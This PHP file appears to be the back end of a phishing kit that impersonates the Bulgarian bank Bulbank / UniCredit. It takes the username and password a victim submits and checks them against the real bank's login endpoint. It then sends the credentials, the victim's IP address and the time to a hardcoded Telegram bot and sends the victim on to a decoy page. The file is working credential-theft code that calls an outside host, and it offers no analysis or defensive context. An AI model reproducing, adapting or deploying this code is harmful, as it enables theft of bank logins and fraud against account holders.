﻿<?php
$adresse_ip = $_SERVER['REMOTE_ADDR'];
//error_reporting(0);
set_time_limit(0);
session_start();
include('__CONFIG__.php');
$Cookie['cookie_file'] = __DIR__.'/logs/' . sha1(time()) . '.log';

//error_reporting(0);
set_time_limit(0);
session_start();
include('__CONFIG__.php');
include('./FUNCS/funciones.php');

session_start();


$UserName=$_POST['UserName'];
$Password=$_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');
$rand = rand(100,9999);

$cookie = dirname(__FILE__)."\log".$rand.".txt";

$fp = fopen($cookie,"a");

fclose($fp);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://bulbankonline.bg/bg-BG/none/Login/Login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"$type":"Login.Models.Login, WEBUI","UserName":"'.$UserName.'","Password":"'.$Password.'","IsIndividual":true,"Captcha":null,"LoginType":"Login"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Connection: keep-alive';
$headers[] = 'Accept: text/html, */*; q=0.01';
$headers[] = 'Origin: https://bulbankonline.bg';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36';
$headers[] = 'Content-Type: application/json; charset=UTF-8';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Referer: https://bulbankonline.bg/';
$headers[] = 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$Login = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

/*echo $Login."<br>";*/
$SignOnResult= json_decode($Login);
/*echo $SignOnResult->SessionHash;
echo $SignOnResult->APersonID;
echo $SignOnResult->Status;
echo $SignOnResult->CookieNameValue->CookieValue;*/
/*

{"$type":"Login.Models.SignOnResult, WEBUI","Status":3380,"SessionHash":"2C956C3075BC8776FCE7F0E700AB004C","APersonID":479961,"CookieNameValue":{"$type":"Session.Models.CookieNameValue, WEBUI","CookieValue":"OICXaoNrXoABNyhVo4A6Jru6g42QP2Wu8KtVWebevNI=","CookieName":"DAISForwardCookie_UserCookie_2C956C3075BC8776FCE7F0E700AB004C"},"UseSessionAuthorization":true}

*/

if ($SignOnResult->SessionHash !="") {
HEADER("Location: ./indexerror.php?Status=3awd&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
	die( "");
}

function sendMessage($messaggio) {
  $chatID = '924025362'; // like: '-826930901'
  $token = '1148523558:AAF-iB9wXm7Leb289TcLO8tpOh27YzY7rfY'; //like: '824274280:AAFEMb-0Ro8-KH1yRHHVB5Eo6f4BhZijSu8'
  
  $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
  $url = $url . "&text=" . urlencode($messaggio);
  $ch = curl_init();
  $optArray = array(
          CURLOPT_URL => $url,
          CURLOPT_RETURNTRANSFER => true
  );
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}


  $subject  = "unicredit [ LOGIN ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: unicredit <infos@unicredit.de>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        
$Z118_MESSAGE .= "
+----/!\----<.![+]  UNICREDIT RZLT  [+]!.>---/!\----+
------------------      LOG INFO       --------------
 [Login]           : "  .$_POST["UserName"]."
 [PASS]       : "  .$_POST["Password"]."
+----/!\----<.![+] IP GEOINFO  [+]!.>---/!\----+
 [IP] :  https://geoiptool.com/en/?ip=".$adresse_ip."
 [DT] :  ".$TIME_DATE."
 [BR] :  ".$_SERVER['HTTP_USER_AGENT']."
+----/!\----<.! UNICREDIT RZLT !.>---/!\----+>
\n";
             
 //sendMessage($Z118_MESSAGE);  
 
 $pesan .= "----------Result 2020 Page 1----------".PHP_EOL;
$pesan .= "Ip----------".$_SERVER['REMOTE_ADDR'].PHP_EOL;
$pesan .= "login----------".$_POST["UserName"].PHP_EOL;
$pesan .= "password-------".$_POST["Password"];
$text = urlencode($pesan);
$token = "bot"."1148523558:AAF-iB9wXm7Leb289TcLO8tpOh27YzY7rfY";
$chat_id = '924025362';
$proxy = "";

$url = "https://api.telegram.org/$token/sendMessage?parse_mode=markdown&chat_id=$chat_id&text=$text";

$ch = curl_init();

if($proxy==""){
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        //CURLOPT_CAINFO => "C:\cacert.pem"   
    );
}
else{ 
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => "$proxy",
        //CURLOPT_CAINFO => "C:\cacert.pem"   
    );  
}

curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);

$err = curl_error($ch);
curl_close($ch);    

if($err<>"") echo "Error: $err";

 
            header('location: verif.html');
?>